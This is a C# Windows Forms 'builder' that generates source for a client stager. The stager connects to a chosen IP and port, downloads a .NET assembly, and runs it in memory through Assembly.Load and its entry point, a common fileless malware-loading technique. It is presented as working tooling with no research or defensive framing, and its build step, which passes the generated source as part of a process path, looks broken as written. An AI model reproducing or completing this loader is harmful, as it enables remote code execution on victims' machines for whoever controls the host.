using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace server
{
    public partial class build : Form
    {
        public build()
        {
            InitializeComponent();
        }
        string code1 = "using System;\r\nusing System.Collections.Generic;\r\nusing System.Net.Sockets;\r\nusing System.Reflection;\r\n\r\nnamespace client\r\n{\r\n    internal class Program\r\n    {\r\n        ";
        string code2 = "\r\n        public static void Main()\r\n        {\r\n\r\n            TcpClient client = new TcpClient(IP, port);\r\n\r\n            // 接收文件\r\n            byte[] receivedData = ReceiveFile(client);\r\n\r\n            client.Close();\r\n            Assembly assembly = Assembly.Load(receivedData);\r\n            //Assembly assembly = Assembly.Load(File.ReadAllBytes(\"1.exe\"));\r\n            // 获取入口方法\r\n            MethodInfo entryPoint = assembly.EntryPoint;\r\n\r\n            // 如果入口方法存在，调用它\r\n            if (entryPoint != null)\r\n            {\r\n                // 创建入口方法的参数数组\r\n                object[] parameters = new object[] { }; // 传递一个空字符串数组作为参数示例\r\n\r\n                // 调用入口方法\r\n                entryPoint.Invoke(null, parameters);\r\n            }\r\n        }\r\n        public static byte[] ReceiveFile(TcpClient client)\r\n        {\r\n            NetworkStream netStream = client.GetStream();\r\n            List<byte> receivedBytes = new List<byte>();\r\n            byte[] buffer = new byte[4096];\r\n            int bytesRead;\r\n\r\n            while ((bytesRead = netStream.Read(buffer, 0, buffer.Length)) > 0)\r\n            {\r\n\r\n                for (int i = 0; i < bytesRead; i++)\r\n                {\r\n                    receivedBytes.Add(buffer[i]);\r\n                }\r\n            }\r\n\r\n            Console.WriteLine(\"文件接收完成。\");\r\n\r\n            return receivedBytes.ToArray();\r\n        }\r\n\r\n    }\r\n}\r\n";
        private void button1_Click(object sender, EventArgs e)
        {
            string ip = textBox1.Text;
            string port = textBox2.Text;
            string code = code1 + $"static string IP = \"{ip}\";\n" + $"static int port = {port};" + code2;
            string pathToExecutable = "build.exe " + code;
            Process.Start(pathToExecutable);
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
        }
    }
}
